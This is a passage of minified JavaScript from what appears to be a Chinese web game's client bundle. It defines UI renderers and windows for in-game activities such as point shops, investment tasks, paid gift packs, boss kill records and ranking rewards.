r.GlobalFun.openRechargeWin()}},e}(n.BaseItemRender);e.OSATarget3Panel15Item=l,window.OSATarget3Panel15Item=l,__reflect(l.prototype,"OSATarget3Panel15Item",[]),window.OSATarget3Panel15Item=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget40Item2=void 0;var n=i(3),o=function(t){function e(){var e=t.call(this)||this;return e._sn_="richicon",e}return __extends(e,t),e.prototype.dataChanged=function(){if(this.data){var t=this.data;this.item.data=t}},e}(n.BaseItemRender);e.OSATarget40Item2=o,window.OSATarget40Item2=o,__reflect(o.prototype,"OSATarget40Item2",[]),window.OSATarget40Item2=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget40JFStoreItem=void 0;var n=i(18),o=i(3),s=i(0),a=i(9),r=function(t){function e(){var e=t.call(this)||this;return e.skinName="JFStoreItemSkin",e}return __extends(e,t),e.prototype.dataChanged=function(){if(this.data){var t=this.data,e=a.Activity.ins().activityData[t.id];this.itemIcon.data=t.rewards[0],this.eName.text=s.GlobalConfig.ItemConfig[t.rewards[0].id].name,this.money.text=t.score+"",t.count>=0?(this.eNum.text=t.count-e.exchangeNums[t.index]+"/"+t.count,this.eNum.textColor=t.count-e.exchangeNums[t.index]==0?n.ColorUtil.RED:n.ColorUtil.GREEN,this.eGroup.visible=!0):this.eGroup.visible=!1}},e}(o.BaseItemRender);e.OSATarget40JFStoreItem=r,window.OSATarget40JFStoreItem=r,__reflect(r.prototype,"OSATarget40JFStoreItem",[]),window.OSATarget40JFStoreItem=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget40JFStoreWin=void 0;var n=i(1),o=i(0),s=i(2),a=i(9),r=i(563),l=function(t){function e(){var e=t.call(this)||this;return e._sn_="JFStoreSkin",e.isTopLevel=!0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.eList.itemRenderer=r.OSATarget40JFStoreItem,this.addTouchEvent(this,this.onClick)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.actId=t[0],this.observe(a.Activity.ins().postActivityIsGetAwards,this.update),this.update()},e.prototype.update=function(){this.data=a.Activity.ins().activityData[this.actId];var t=[],e=o.GlobalConfig.ActivityType40_1Config[this.actId];for(var i in e)e[i].score&&t.push(e[i]);this.eList.dataProvider=new eui.ArrayCollection(t),this.money.text=this.data.score+""},e.prototype.onClick=function(t){if(t.target instanceof eui.Button&&t.target.parent instanceof r.OSATarget40JFStoreItem){var e=t.target.parent.data,i=a.Activity.ins().activityData[e.id];return void(i.exchangeNums[e.index]>=e.count?s.TipsCT.ins().showTips(gettext("兑换次数不足")):i.score<e.score?s.TipsCT.ins().showTips(gettext("积分不足")):a.Activity.ins().sendReward(this.actId,0,3,e.index))}t.target==this.eCloseRect&&win.close(this)},e.prototype.enterFrame=function(){this.data&&(this.eTime.text=this.data.getRemainTime())},e}(n.BaseView);e.OSATarget40JFStoreWin=l,window.OSATarget40JFStoreWin=l,__reflect(l.prototype,"OSATarget40JFStoreWin",[]),window.OSATarget40JFStoreWin=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget41Item1=void 0;var n=i(3),o=i(11),s=i(6),a=i(35),r=i(2),l=i(9),h=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.createChildren=function(){this.itemList.itemRenderer=o.ItemBase,this.itemList.dataProvider=new eui.ArrayCollection([]),this.addTouchEvent(this.btn,this.onClick)},e.prototype.dataChanged=function(){this.itemList.dataProvider=new eui.ArrayCollection(this.data.reward||[]);var t=l.Activity.ins().activityData[this.data.activityID];if(t){this.btn.enabled=!!t.hasBuy&&1==this.data.status,this.btn.eRp&&(this.btn.eRp.visible=this.btn.enabled);var e=t.getCurDay(),i="";i=!t.hasBuy&&e>=this.data.target?gettext("激活即可领取"):2==this.data.status?"":gettext("第{0}天可领取",this.data.target),this.lab.text=i,this.eGetImg.visible=2==this.data.status,this.btn.visible=!this.eGetImg.visible}},e.prototype.onClick=function(){var t=a.TaskCT.ins().getInvestmentTask(this.data.id,this.data.index);if(1==t.status){var e=s.BagCT.ins().rockonNeedNum(this.data.reward);return s.BagCT.ins().getAllSurplusCount(e)<=0?void r.TipsCT.ins().showTips(gettext("背包空间不足请扩容")):void a.TaskCT.ins().sendInvestmentTaskData(this.data.id,this.data.index)}},e}(n.BaseItemRender);e.OSATarget41Item1=h,window.OSATarget41Item1=h,__reflect(h.prototype,"OSATarget41Item1",[]),window.OSATarget41Item1=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget41Panel2Item=void 0;var n=i(3),o=i(11),s=i(35),a=i(4),r=i(26),l=i(0),h=i(92),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="osa41p2itemskin",e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.eList.itemRenderer=o.ItemBase},e.prototype.dataChanged=function(){if(this.data){var t=this.data,e="",i="act41_level",n=gettext("我的等级"),o="";switch(t.type){case 8:e=gettext("{0}级",t.target),o=gettext("{0}级",a.ActorCC.level);break;case 19:e=gettext("{0}转",t.target),o=gettext("{0}转",r.ZsCT.ins().stage);break;case 100:e=gettext("{0}天",t.target),i="act41_day",n=gettext("我的天数");var u=0,p=s.TaskCT.ins().getInvestmentAllTask(t.id);p&&p.overTime&&(u=l.GlobalConfig.ActivityType41Config[p.activityId].time-p.overTime/86400),o=gettext("{0}天",u);break;case 62:i="act41_layer",n=gettext("我的通天塔层数");var d=l.GlobalConfig.FbChallengeConfig[t.target];e=gettext("{0}重天{1}层",d.group,d.layer);var c=l.GlobalConfig.FbChallengeConfig[h.SkyLevelModel.ins().cruLevel-1];o=c?gettext("{0}重天{1}层",c.group,c.layer):gettext("未开始挑战")}this.eInfo.text=e,this.eImg.source=i,this.eDesc.text=n,this.eLevel.text=o,this.eList.dataProvider=new eui.ArrayCollection(t.reward),this.eDesc.visible=this.eLevel.visible=!0,this.eBtn.visible=this.eGet.visible=!1;var f=s.TaskCT.ins().getInvestmentTask(t.id,t.index);f&&(this.eBtn.visible=this.eBtn.sRp=1==f.status,this.eGet.visible=2==f.status,this.eDesc.visible=this.eLevel.visible=0==f.status)}},e}(n.BaseItemRender);e.OSATarget41Panel2Item=u,window.OSATarget41Panel2Item=u,__reflect(u.prototype,"OSATarget41Panel2Item",[]),window.OSATarget41Panel2Item=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget41Panel3Item=void 0;var n=i(3),o=i(269),s=i(6),a=i(35),r=i(2),l=i(9),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="osa41p3itemSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.lstOrdinary.itemRenderer=o.ItemBaseEff5,this.lstLuxury.itemRenderer=o.ItemBaseEff5,this._rewardArr0=new eui.ArrayCollection,this._rewardArr1=new eui.ArrayCollection,this.lstOrdinary.dataProvider=this._rewardArr0,this.lstLuxury.dataProvider=this._rewardArr1,this.addTouchEvent(this.btnOrdinary,this.onClick),this.addTouchEvent(this.btnLuxury,this.onClick)},e.prototype.dataChanged=function(){if(this._info=this.data,this._cfg=this._info.cfg,this.data&&this.skin){var t=this._info.cfg;this.eInfo0.text=this.eInfo.text=gettext("击杀{0}只",t.target);var e=[];this._rewardArr0.replaceAll(e.concat(t.freeReward)),e=[],this._rewardArr1.replaceAll(e.concat(t.reward));var i=a.TaskCT.ins().getInvestmentTask(t.id,t.index),n=l.Activity.ins().activityData[this._info.actId];if(i){if(null===n||void 0===n?void 0:n.hasBuy)switch(i.status){case 0:this.btnLuxury.currentState="lock";break;case 1:this.btnLuxury.currentState="unLock";break;case 2:this.btnLuxury.currentState="got"}else this.btnLuxury.currentState="lock";0!=i.status?i.free&&1==i.free?this.btnOrdinary.currentState="got":this.btnOrdinary.currentState="unLock":this.btnOrdinary.currentState="lock"}}},e.prototype.onClick=function(t){var e=this._info.cfg,i=a.TaskCT.ins().getInvestmentTask(e.id,e.index),n=l.Activity.ins().activityData[this._info.actId];if(!i)return void r.TipsCT.ins().showTips(gettext("未达到任务目标"));switch(t.currentTarget){case this.btnOrdinary:if(0!=i.status)if(i.free&&1==i.free)r.TipsCT.ins().showTips(gettext("免费奖励已领取"));else{var o=s.BagCT.ins().rockonNeedNum(e.freeReward);if(s.BagCT.ins().getAllSurplusCount(o)<=0)return void r.TipsCT.ins().showTips(gettext("背包空间不足请扩容"));a.TaskCT.ins().sendInvestmentTaskData(e.id,e.index,1)}else r.TipsCT.ins().showTips(gettext("未达到任务目标"));break;case this.btnLuxury:if(n.hasBuy)switch(i.status){case 0:r.TipsCT.ins().showTips(gettext("未达到任务目标"));break;case 1:var o=s.BagCT.ins().rockonNeedNum(e.reward);if(o&&s.BagCT.ins().getAllSurplusCount(o)<0)return void r.TipsCT.ins().showTips(gettext("背包空间不足请扩容"));a.TaskCT.ins().sendInvestmentTaskData(e.id,e.index,0);break;case 2:r.TipsCT.ins().showTips(gettext("豪华礼包购已领取"))}else r.TipsCT.ins().showTips(gettext("未购买豪华礼包"))}},e}(n.BaseItemRender);e.OSATarget41Panel3Item=h,window.OSATarget41Panel3Item=h,__reflect(h.prototype,"OSATarget41Panel3Item",[]),window.OSATarget41Panel3Item=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget49ItemRender=void 0;var n=i(19),o=i(5),s=i(3),a=i(0),r=i(36),l=i(6),h=i(2),u=i(9),p=function(t){function e(){var e=t.call(this)||this;return e._sn_="AppearanceLeaseItemRenderSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.mc=ObjectPool.pop("MovieClip"),this.EffGrp.addChild(this.mc),this.dataChanged()},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this.eBuy,this.onClick)},e.prototype.dataChanged=function(){if(this.data){var t=this.data,e=u.Activity.ins().activityData[t.actid],i=e.dressId;this.mc.playFile(RES_DIR_EFF+t.show,-1),this.numStr=(i>=t.index?0:t.price-e.hasPay)+"",this.attrStr=t.tips1,this.attrStr1=t.tips2,this.costCm1.setData({type:1,id:r.MoneyConst.yuanbao,count:t.price},!0,!1);var n=e.hasRecharge<t.price?16711680:3532333;a.GlobalConfig.ClientGlobalConfig.rate;this.desc.textFlow=o.TextFlowMaker.generateTextFlow1(gettext("充值|C:0x35E62D&T:{0}元宝|即可租赁",t.chargeAmountLimit)+"（|C:"+n+"&T:"+e.hasRecharge+"|/|C:0x35E62D&T:"+t.chargeAmountLimit+"|）"),this.eBuy.visible=!e.hasBuyById(t.index),this.buyLab.visible=!this.eBuy.visible}},e.prototype.onClick=function(){var t=this.data,e=u.Activity.ins().activityData[t.actid];e.dressId;if(n.GlobalFun.checkCost(t.price,r.MoneyConst.yuanbao)){var i=l.BagCT.ins().rockonNeedNum(t.award);return l.BagCT.ins().getAllSurplusCount(i)<=0?void h.TipsCT.ins().showTips(gettext("背包空间不足请扩容")):void u.Activity.ins().sendReward(t.actid,t.index)}},e}(s.BaseItemRender);e.OSATarget49ItemRender=p,window.OSATarget49ItemRender=p,__reflect(p.prototype,"OSATarget49ItemRender",[]),window.OSATarget49ItemRender=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget52ItemRender=void 0;var n=i(5),o=i(3),s=function(t){function e(){var e=t.call(this)||this;return e.skinName="HuntListRendererSkin",e}return __extends(e,t),e.prototype.dataChanged=function(){this.data&&(this.showText.textFlow=n.TextFlowMaker.generateTextFlow(this.data))},e}(o.BaseItemRender);e.OSATarget52ItemRender=s,window.OSATarget52ItemRender=s,__reflect(s.prototype,"OSATarget52ItemRender",[]),window.OSATarget52ItemRender=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget56Item=void 0;var n=i(3),o=i(0),s=i(9),a=i(11),r=i(25),l=i(2),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="osa56pitemskin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this,this.onClick),this.eList.itemRenderer=a.ItemBase},e.prototype.dataChanged=function(){if(this.data){var t=this.data;this.eList.dataProvider=new eui.ArrayCollection(t.awardItem);var e=s.Activity.ins().getActivityDataById(t.Id);if(e){var i=t.buyTimeLimit-e.giftData[t.giftId];this.eNum.text=gettext("可购买{0}次",i),this.eBtn.enabled=!!i,i>0?this.eBtn.label=gettext("{0}元",t.ybCount/o.GlobalConfig.ClientGlobalConfig.rate):this.eBtn.label=gettext("已购买"),this.eIcon.source=t.img?t.img:"",this.eTitle.source=t.giftName?t.giftName:""}}},e.prototype.onClick=function(t){switch(t.target){case this.eBtn:var e=this.data;if(urlParam.appid){var i=o.GlobalConfig.ActivityConfig[e.Id];
if(i&&i.onlyappid){var n=!1;for(var s in i.onlyappid)urlParam.appid==i.onlyappid[s]&&(n=!0);if(!n)return void(i.onlyappidTip?l.TipsCT.ins().showTips(i.onlyappidTip):l.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:关注公众号转端获得奖励|")))}}r.Recharge.ins().sendPayOrder(e.rid)}},e}(n.BaseItemRender);e.OSATarget56Item=h,window.OSATarget56Item=h,__reflect(h.prototype,"OSATarget56Item",[]),window.OSATarget56Item=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget57Item=void 0;var n=i(3),o=i(0),s=i(4),a=i(9),r=i(204),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="osa57pitemskin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this,this.onClick)},e.prototype.dataChanged=function(){var t=this.data;this._cfg=t.cfg,this._actId=t.actId,this.data&&this.flusInfo()},e.prototype.flusInfo=function(){this._actData=a.Activity.ins().getActivityDataById(this._actId);var t=o.GlobalConfig.MonstersConfig[this._cfg.bossId];this.iconDisplay.source="monhead"+t.head+"_png",this.boss.text=t.name,this.level.text=this._cfg.name,this.noAct.visible=this.checkIsLock(),this.setSel(r.ActivityType57Data.selBossId==this._cfg.bossId),this.selffirstBlood.visible=this._actData.checkBossIsKilledByMe(r.ActivityType57Data.selType,this._cfg.bossId),this.redPoint.visible=this._actData.checkAward(r.ActivityType57Data.selType,this._cfg.bossId);var e=this._actData.checkBossHasFirstBlood(r.ActivityType57Data.selType,this._cfg.bossId);this.killer.text=e&&""!=e.name?e.name:gettext("无"),this.firstBlood.visible=this._actData.checkBossIsMyFirstBlood(r.ActivityType57Data.selType,this._cfg.bossId)},e.prototype.setSel=function(t){this.currentState=t?"down":"up"},e.prototype.checkIsLock=function(){return s.ActorCC.power<this._cfg.power},e.prototype.onClick=function(t){t.target},e}(n.BaseItemRender);e.OSATarget57Item=l,window.OSATarget57Item=l,__reflect(l.prototype,"OSATarget57Item",[]),window.OSATarget57Item=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget57TypeItem=void 0;var n=i(3),o=i(0),s=i(9),a=i(204),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="osa57pItemTypeskin",e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.dataChanged=function(){this._groupType=this.data;var t=o.GlobalConfig.ActivityBaseConfig.Type57Icon;this.imgIcon.source=t&&t.length>0?t[this._groupType-1]:"",this.setSel(this._groupType==a.ActivityType57Data.selType);var e=s.Activity.ins().getActivityDataById(a.ActivityType57Data.actId);this.imgRed.visible=e.checkTypeAward(this._groupType)},e.prototype.setSel=function(t){this.imgSel.visible=t},e}(n.BaseItemRender);e.OSATarget57TypeItem=r,window.OSATarget57TypeItem=r,__reflect(r.prototype,"OSATarget57TypeItem",[]),window.OSATarget57TypeItem=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget58Item=void 0;var n=i(0),o=i(1),s=i(49),a=i(21),r=i(16),l=function(t){function e(e){var i=t.call(this)||this;return i._sn_="ActivityFbItemSkin",i.cfg=e,i}return __extends(e,t),e.prototype.skinComplete=function(){this.x=this.cfg.showPos[0],this.y=this.cfg.showPos[1],this.eGrp.scaleX=this.cfg.showPos[2]||1,this.mc=new a.MovieClip,this.eBoss.addChild(this.mc)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addEvent(egret.Event.CHANGE,this.mc,this.updateMC),this.updateView(),this.update()},e.prototype.removeDisplay=function(){r.DisplayUtils.removeFromParent(this.mc)},e.prototype.updateData=function(t){this.data=t,this.update()},e.prototype.updateMC=function(){this.cfg.cid!=this.data.cid+1&&this.mc.gotoAndStop(1)},e.prototype.update=function(){if(this.data&&this.skin){var t=this.data.cid;this.locked.visible=this.passed.visible=this.eBg.visible=!1,this.eGrp.filters=null,this.mc.playFile(RES_DIR_BODY+(n.GlobalConfig.MonstersConfig[this.cfg.bossId].avatar+"_3s"),-1),this.cfg.cid==t+1?this.eBg.visible=!0:this.cfg.cid<=t?(this.passed.visible=!0,this.eGrp.filters=s.FilterUtil.ARRAY_GRAY_FILTER):this.locked.visible=!0,this.currentState="level"+this.cfg.cid}},e.prototype.updateView=function(){this.eName.source="act58_level"+this.cfg.cid,this.eItem.data=this.cfg.reward[0]},e}(o.BaseView);e.OSATarget58Item=l,window.OSATarget58Item=l,__reflect(l.prototype,"OSATarget58Item",[]),window.OSATarget58Item=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget59Item=void 0;var n=i(3),o=i(11),s=i(5),a=i(4),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="osa59pitemskin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.eList.itemRenderer=o.ItemBase,this.addTouchEvent(this,this.onClick)},e.prototype.dataChanged=function(){if(this.data){var t=this.data.cfg;this.eList.dataProvider=new eui.ArrayCollection(t.reward),this.player=this.data.player;var e="";this.eName.textFlow=s.TextFlowMaker.generateTextFlow1(this.player?e+("|U&T:"+this.player.name):e+gettext("虚位以待")),this.imgRank.source="hanghui_json.rank_"+t.personRank}},e.prototype.onClick=function(t){switch(t.target){case this.eName:if(!this.player)return;if(a.ActorCC.actorID==this.player.id&&a.ActorCC.serverName==this.player.servId)return void win.open("RolePanel");win.open("PlayerTipsWin",this.player)}},e}(n.BaseItemRender);e.OSATarget59Item=r,window.OSATarget59Item=r,__reflect(r.prototype,"OSATarget59Item",[]),window.OSATarget59Item=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget5Panel4Item=void 0;var n=i(3),o=function(t){function e(){var e=t.call(this)||this;return e.skinName="BtnTab13Skin",e}return __extends(e,t),e.prototype.dataChanged=function(){if(this.data){var t=this.data[0],e=this.data[1];this.bg.source=t.tabImg;var i=e.getRewardState(t.day);this.stateImg.visible=2==i,this.eRp.visible=1==i}},Object.defineProperty(e.prototype,"selected",{set:function(t){this.chosen.visible=t},enumerable:!1,configurable:!0}),e}(n.BaseItemRender);e.OSATarget5Panel4Item=o,window.OSATarget5Panel4Item=o,__reflect(o.prototype,"OSATarget5Panel4Item",[]),window.OSATarget5Panel4Item=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget60Item=void 0;var n=i(3),o=i(0),s=i(9),a=i(11),r=i(5),l=i(10),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="osa60itemskin",e.state=!1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.eList.itemRenderer=a.ItemBase,this.addTouchEvent(this,this.onClick)},e.prototype.dataChanged=function(){if(this.data){var t=this.data,e={type:1,id:t.itemId,count:1};this.eIcon.data=e;var i=o.GlobalConfig.ItemConfig[t.itemId],n=l.ItemUtil.getQuality2(i);this.eName.textFlow=r.TextFlowMaker.generateTextFlow1("|C:"+l.ItemUtil.getQualityColor(n)+"&T:"+i.name),this.eList.dataProvider=new eui.ArrayCollection(t.rewards);var a=s.Activity.ins().getActivityDataById(t.Id);if(a&&a.info[t.index]){var h=a.info[t.index].count;this.eNum.text=0>h?gettext("无限制"):h+"";var u=a.info[t.index].state;this.state=this.eGet.visible=this.eBtn.visible=!1,this.eTxt.text="",this.eBtn.sRp=this.eBtn.visible=1==u,this.eGet.visible=2==u,h||u?0==u&&(this.state=!0,this.eTxt.textFlow=r.TextFlowMaker.generateTextFlow1(gettext("|U:&C:0xF2CA00&T:前往获得|"))):this.eTxt.textFlow=r.TextFlowMaker.generateTextFlow1(gettext("|&C:0xB1B097&T:已满领取上限|"))}}},e.prototype.onClick=function(t){var e=this.data;if(e)switch(t.target){case this.eBtn:s.Activity.ins().sendReward(e.Id,e.index);break;case this.eTxt:this.state&&e.turn&&win.open.apply(win,__spreadArrays([e.turn[0]],e.turn.slice(1)))}},e}(n.BaseItemRender);e.OSATarget60Item=h,window.OSATarget60Item=h,__reflect(h.prototype,"OSATarget60Item",[]),window.OSATarget60Item=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.Act62RewardItem=void 0;var n=i(11),o=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._isOpen=!1,e}return __extends(e,t),e.prototype.dataChanged=function(){t.prototype.dataChanged.call(this),this.data?(this.currentState="node",this._isOpen=!0,this.itemIcon.imgFlop.visible=!1,this.data["double"]>1?(this["double"].visible=!0,this["double"].text="!"+this.data["double"]):this["double"].visible=!1):(this.currentState="flop",this._isOpen=!1,this.itemIcon.imgFlop.visible=!0,this["double"].visible=!1)},e.prototype.updateState=function(){},Object.defineProperty(e.prototype,"isOpen",{get:function(){return this._isOpen},enumerable:!1,configurable:!0}),__decorate([delayCall(100)],e.prototype,"dataChanged",null),e}(n.ItemBase);e.Act62RewardItem=o,window.Act62RewardItem=o,__reflect(o.prototype,"Act62RewardItem",[]),window.Act62RewardItem=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.Act62GoodWin=void 0;var n=i(1),o=i(0),s=i(76),a=i(2),r=i(9),l=i(579),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="osa62p1selectskin",e.curSelectIndex=-1,e.layer=LayoutNum.top,e}return __extends(e,t),e.prototype.skinComplete=function(){this.itemList.itemRenderer=l.Act62GoodItem,this.itemList.dataProvider=this.itemListData=new eui.ArrayCollection},e.prototype.setSkinName=function(){},e.prototype.addDisplay=function(t){this.sureBtn.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onTap,this),this.notBtn.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onTap,this),this.closeBtn0.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onTap,this),this.btnLook.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onTap,this),this.btnHelp.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onTap,this),this.itemList.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.onlistBagItemClick,this),this.actData=t,this.updateContent()},e.prototype.setBtnLabel=function(t,e){t&&(this.notBtn.label=t),e&&(this.sureBtn.label=e)},e.prototype.onTap=function(t){return __awaiter(this,void 0,void 0,function(){var e,i,n,l;return __generator(this,function(h){switch(t.currentTarget){case this.sureBtn:if(this.curSelectIndex<0)return a.TipsCT.ins().showTips(gettext("未选择心愿物品")),[2];r.Activity.ins().sendReward(this.actData.id,1,this.curSelectIndex+1),win.close(this);break;case this.notBtn:case this.closeBtn0:win.close(this);break;case this.btnHelp:win.open(s.CommonHelpWin,gettext("这里是规则说明"));break;case this.btnLook:if(e=this.actData.getCurLayer(),i=o.GlobalConfig.ActivityType62Config[this.actData.id][e],n=i.bigReward||[],l=n[this.curSelectIndex],!l)return[2]}return[2]})})},e.prototype.updateContent=function(){for(var t=this.actData.getCurLayer(),e=this.actData.getBigRewardState(),i=o.GlobalConfig.ActivityType62Config[this.actData.id][t],n=i.bigReward||[],s=[],a=0;a<n.length;a++){var r={};r.id=n[a].id,r.count=n[a].count,r.type=n[a].type,r.state=e[a],s.push(r)}this.itemListData.source=s},e.prototype.onlistBagItemClick=function(t){var e=t.itemRenderer;e.isGet()||(this.lastItem&&this.lastItem.setSelect(!1),this.curSelectIndex=this.itemList.selectedIndex,e.setSelect(!e.isSelect()),this.lastItem=e)},e}(n.BaseView);e.Act62GoodWin=h,window.Act62GoodWin=h,__reflect(h.prototype,"Act62GoodWin",[]),window.Act62GoodWin=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.Act62GoodItem=void 0;var n=i(49),o=i(3),s=function(t){function e(){var e=t.call(this)||this;return e._sn_="osa62p1selectItem",e}return __extends(e,t),e.prototype.skinComplete=function(){this.item.touchEnabled=!1,this.item.touchChildren=!1,this.setSelect(!1)},e.prototype.dataChanged=function(){var t=this.data;this.item.data=t,1!=t.state?this.filters=null:this.filters=n.FilterUtil.ARRAY_GRAY_FILTER},e.prototype.isGet=function(){return 1==this.data.state},e.prototype.setSelect=function(t){this.imgSelect.visible=t},e.prototype.isSelect=function(){return this.imgSelect.visible},e}(o.BaseItemRender);e.Act62GoodItem=s,window.Act62GoodItem=s,__reflect(s.prototype,"Act62GoodItem",[]),window.Act62GoodItem=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.Act62PreviewWin=void 0;var n=i(1),o=i(0),s=i(581),a=function(t){function e(){var e=t.call(this)||this;return e._sn_="osa62p1rateskin",e.layer=LayoutNum.top,e}return __extends(e,t),e.prototype.addDisplay=function(t,e){var i=o.GlobalConfig.ActivityType62Config[t][e];this.listItem.itemRenderer=s.Act62PreviewItem,this.listItem.dataProvider=new eui.ArrayCollection(i.reward)},e}(n.BaseView);e.Act62PreviewWin=a,window.Act62PreviewWin=a,__reflect(a.prototype,"Act62PreviewWin",[]),window.Act52PreviewWin=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.Act62PreviewItem=void 0;var n=i(70),o=i(3),s=i(0),a=function(t){function e(){var e=t.call(this)||this;return e._sn_="ActPanelRateItem52_1EUI",e}return __extends(e,t),e.prototype.dataChanged=function(){var t=this.data,e=s.GlobalConfig.ItemConfig[t.id];this.lbName.text=e.name,this.lbRate.text=n.MathUtils.toFixed(t.rate,2)+"%"},e}(o.BaseItemRender);e.Act62PreviewItem=a,window.Act62PreviewItem=a,__reflect(a.prototype,"Act62PreviewItem",[]),window.Act62PreviewItem=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.Act62RewardWin=void 0;var n=i(1),o=i(11),s=i(0),a=function(t){function e(){var e=t.call(this)||this;return e._sn_="osa62p1rewardskin",e.layer=LayoutNum.top,e._actId=null,e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(t,e){this._actId=t;var i=s.GlobalConfig.ActivityType62Config[this._actId],n=[];for(var a in i)n=n.concat(i[a].bigReward);this.itemList.itemRenderer=o.ItemBase,this.itemList.dataProvider=new eui.ArrayCollection(n),this.itemList0.itemRenderer=o.ItemBase,this.itemList0.dataProvider=new eui.ArrayCollection(i[e].bigReward),this.closeBtn0.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onClick,this)},e.prototype.onClick=function(t){switch(t.currentTarget){case this.closeBtn0:win.close(e)}},e}(n.BaseView);e.Act62RewardWin=a,window.Act62RewardWin=a,__reflect(a.prototype,"Act62RewardWin",[]),window.Act62RewardWin=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget64Item2=void 0;var n=i(42),o=i(3),s=i(11),a=i(0),r=i(13),l=i(44),h=i(9),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._playerId=0,e._serverId=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.skinName="KaiFuChongBangPH",this.addTouchEvent(this.headGrp,this.onClickHandler)},e.prototype.onClickHandler=function(){this._playerId>0&&l.ReadPlayerCT.ins().sendFindPlayer(this._playerId,this._serverId)},e.prototype.dataChanged=function(){var t,e,i;if(this.data&&this.skin){this.rewardList1.itemRenderer=s.ItemBase,this.rewardList1.dataProvider=this._awardArr=new eui.ArrayCollection;var n=this.data.cfg;this._awardArr.source=n.rewards,this.conditionDscr.text=n.conditionDscr,this.level.text=this.getScoreDescByType(n.rankingListType,n.condition);var o=h.Activity.ins().getActivityDataById(this.data.actId);if(this.itemIndex<=(null===(i=null===(e=null===(t=this.data.actData)||void 0===t?void 0:t.openServerRank)||void 0===e?void 0:e.rankList)||void 0===i?void 0:i.length)){this.rangNeirongBg.source="cbRangNeirong_"+(this.itemIndex+1);var a=this.getRankPlayerInfo(n,o);if(this.epithet.source="cbFristTitle_"+(this.itemIndex+1),this.rangeBg.source="cbFristRangeBg_"+(this.itemIndex+1),this.rangImg.source="avatarFrame_"+(this.itemIndex+1),a){this._playerId=a.actorId,this._serverId=a.serverId,this.headGrp.visible=!0,this.xwyd.visible=!1,this.fristName.text=a.playerName;var l=a.score;if(6==n.rankingListType){var u=r.SubRoles.ins().getSubRoleByIndex(0).jingMaiData;l=u.stage}this.fristLevel.text=this.getScoreDescByType(n.rankingListType,l),this.head.source="yuanhead"+a.job+"1",this.headGrp.visible=!0,this.paihang.text=gettext("第{0}名",this.itemIndex+1)}else 